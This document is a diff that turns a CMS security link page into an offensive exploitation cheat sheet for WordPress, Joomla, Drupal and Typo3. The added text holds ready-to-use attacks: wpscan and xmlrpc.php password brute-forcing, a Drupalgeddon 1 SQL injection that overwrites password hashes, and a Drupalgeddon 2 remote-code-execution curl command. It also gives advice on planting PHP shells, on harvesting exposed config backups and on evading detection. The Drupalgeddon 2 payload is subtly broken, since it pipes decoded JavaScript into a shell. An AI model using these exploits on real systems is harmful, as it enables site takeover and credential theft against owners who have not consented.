@@ -1,72 +1,148 @@
----
-description: platforms with known vulnerability profiles
----
+# cms exploitation. leverage platform-specific weaknesses.
 
-# cms-specific risks — when convenience meets compromise
-
-{% hint style="info" %}
-## common issues:
-
-* outdated plugins / themes
-* missing input validation in extensions  
-* insecure default configurations
-{% endhint %}
+common attack vectors:
+- outdated plugins/themes with known cves
+- default/weak admin credentials  
+- insecure file upload functionality
+- sql injection in plugins
+- privilege escalation via misconfiguration
 
 ## wordpress
 
-<details>
+### reconnaissance
+```bash
+# wordpress scanner
+wpscan --url http://target.com --enumerate ap,at,cb,dbe
+wpscan --url http://target.com --passwords passwords.txt --usernames admin
 
-<summary>Links:</summary>
+# manual checks
+curl http://target.com/wp-admin/
+curl http://target.com/wp-content/plugins/
+curl http://target.com/xmlrpc.php
+```
 
-[https://lifeinhex.com/stealing-wordpress-credentials/](https://lifeinhex.com/stealing-wordpress-credentials/)
+### xmlrpc.php exploitation
 
-[https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
+test if enabled:
+```xml
+POST /xmlrpc.php
+Content-Type: text/xml
 
-</details>
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+```
 
-<details>
+brute force login:
+```xml
+POST /xmlrpc.php 
+Content-Type: text/xml
 
-<summary>xmlrpc.php exploitation</summary>
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>password123</value></param>
+</params>
+</methodCall>
+```
 
-[https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)
+### common vulnerabilities
 
-[https://www.tutorialspoint.com/xml-rpc/xml\_rpc\_quick\_guide.htm](https://www.tutorialspoint.com/xml-rpc/xml_rpc_quick_guide.htm)
+**plugin upload bypass:**
+- vulnerable upload plugins often allow php execution
+- check `/wp-content/uploads/` for accessible shells
 
-</details>
+**theme editor access:**
+- if admin access gained, edit theme files for php shells
+- `/wp-admin/theme-editor.php`
 
-***
+**wp-config.php exposure:**
+- backup files: `wp-config.php~`, `wp-config.php.bak`
+- contains database credentials
 
-## Joomla
+## joomla
 
-<details>
+### reconnaissance 
+```bash
+# joomla scanner  
+joomscan -u http://target.com
+joomscan -u http://target.com --enumerate-components
 
-<summary>Links:</summary>
+# version detection
+curl http://target.com/administrator/manifests/files/joomla.xml
+```
 
+### common attack points
 
+**administrator panel:**
+- default path: `/administrator/`
+- weak credentials often used
 
-</details>
+**configuration.php exposure:**
+- contains database and secret keys
+- check for backup versions
 
-***
+## drupal
 
-## Typo3
+### reconnaissance
+```bash
+# droopescan
+droopescan scan drupal -u http://target.com
 
-<details>
+# manual version check  
+curl http://target.com/CHANGELOG.txt
+curl http://target.com/INSTALL.txt
+```
 
-<summary>Links:</summary>
+### drupalgeddon exploits
 
+**drupalgeddon 1 (cve-2014-3704):**
+```sql
+# sql injection in form api
+POST /drupal/?q=node&destination=node
+name[0;UPDATE users SET pass = '$S$CTo9G7Lx28rzCfpn16WZ4y05G4LLgfkMlxDZhTgFZjdS.r59RVqOz2';]=test&form_id=user_login_block&op=Log+in
+```
 
+**drupalgeddon 2 (cve-2018-7600):**
+```bash
+# rce via form api
+curl -d "form_id=user_login_block&_triggering_element_name=name" \
+     -d "_triggering_element_value=&op=Log+in" \
+     -d "name[#post_render][]=exec&name[#type]=markup&name[#markup]=echo YWxlcnQoJ1hTUycpOw==|base64 -d|sh" \
+     http://target.com/?q=user/password
+```
 
-</details>
+## typo3
 
-***
+### reconnaissance
+```bash
+# version check
+curl http://target.com/typo3conf/ENABLE_INSTALL_TOOL
+curl http://target.com/typo3/install.php
 
-## Drupal
+# admin interface
+curl http://target.com/typo3/
+```
 
-<details>
+### attack vectors
 
-<summary>Links:</summary>
+**install tool abuse:**
+- if accessible, can lead to full compromise
+- path: `/typo3/install.php`
 
+**extension vulnerabilities:**
+- similar to wordpress plugins
+- check typo3 security bulletins
 
+## operational notes
 
-</details>
+- [!] cms scanners generate significant log entries - use carefully
+- default admin paths are heavily monitored - expect detection
+- always check for version-specific cves after fingerprinting
+- backup and temp files often contain sensitive configuration data
 
+# TODO: add detection evasion techniques for cms scanners
